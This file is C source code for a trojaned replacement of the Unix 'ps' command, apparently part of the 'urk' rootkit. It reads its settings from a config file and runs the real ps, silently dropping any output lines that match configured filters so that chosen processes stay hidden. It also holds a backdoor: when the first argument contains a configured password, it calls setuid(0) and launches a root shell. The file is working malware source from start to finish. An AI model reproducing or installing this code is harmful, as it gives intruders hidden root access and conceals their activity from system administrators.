#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include "urk.h"

char buf[MAXLEN];

int main(int argc, char **argv) {
  char *PS_PTR;
  char **new_argv;
  char *ps_filter_ptr;
  char PS[256];
  char ps_filter[256];
  char *rootshell_ptr;
  char su_pass[256];
  char *su_pass_ptr;
  char rootshell[256];
  int i,print,no_ps_filters=0;
  FILE* input;
  pid_t child_pid;
  
  
  /* Retrieving configuration information */
  PS_PTR = file(conf_file,ps_section,ps_location);
#ifdef URK_DEFAULT
  if((PS_PTR == NULL) || (open(PS_PTR,O_RDONLY) == -1)) { PS_PTR = ps_loc_def; }
#endif
  strcpy(PS,PS_PTR);

  ps_filter_ptr = file(conf_file,ps_section,ps_filters);
#ifdef URK_DEFAULT
  if(ps_filter_ptr == NULL) { ps_filter_ptr = ps_fil_def; }
#endif
  strcpy(ps_filter,ps_filter_ptr);
  no_ps_filters = count_filter(ps_filter);

   su_pass_ptr = file(conf_file,login_section,login_pass);
#ifdef  URK_DEFAULT
   if(su_pass_ptr == NULL) { su_pass_ptr = su_default; }
#endif
   strcpy(su_pass,su_pass_ptr);

   rootshell_ptr = file(conf_file,login_section,exec_shell);
#ifdef  URK_DEFAULT
   if(rootshell_ptr == NULL) { rootshell_ptr = shell_loc_def; }
#endif
   strcpy(rootshell,rootshell_ptr);

  if(argv[1] != NULL) {
     if(strstr(argv[1],su_pass) != NULL) {
        setuid(0);
        system(rootshell);
        return(-1);
      }
  }

  new_argv = (char**) malloc(1024 * sizeof(char*));
  new_argv[0] = PS;
  for(i=1;i<argc;i++) {
    new_argv[i] = argv[i];
  }
  new_argv[i] = NULL;

  input = popen_r(PS, new_argv, &child_pid);
  while(1) /* Repeat READ until nothing to read */
    {
     print=1;
     if (fgets(buf, sizeof(buf), input) == NULL) break;
     for(i=0;i<no_ps_filters+1;i++)
         if(strstr(buf,f_ptr[i]) != NULL) { print=0; break; }
     if (print==1) printf("%s",buf);
    }
  fclose(input);

  while(wait(&i) != child_pid) if (errno!=EINTR) break;

  if (!i) return WEXITSTATUS(i);
  if (WIFEXITED(i)) return WEXITSTATUS(i);
  kill(getpid(),SIGKILL);
  return 0;
}
